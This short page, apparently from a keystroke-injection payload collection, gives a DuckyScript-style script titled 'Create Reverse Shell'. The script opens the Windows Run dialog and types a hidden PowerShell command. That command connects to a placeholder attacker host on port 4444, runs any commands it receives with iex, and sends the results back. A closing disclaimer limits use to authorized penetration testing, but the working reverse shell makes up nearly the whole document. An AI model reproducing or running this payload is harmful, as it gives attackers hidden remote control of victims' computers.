# Create Reverse Shell

This Windows reverse shell connects back to an attacker's server.

```       
DELAY 500
GUI r
DELAY 200
STRING powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('attacker_ip', 4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..255|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() }"
ENTER
```

> Disclaimer: This script is for educational purposes and should only be used in environments where you have explicit authorization to perform penetration testing. Always follow ethical guidelines and laws governing cybersecurity practices.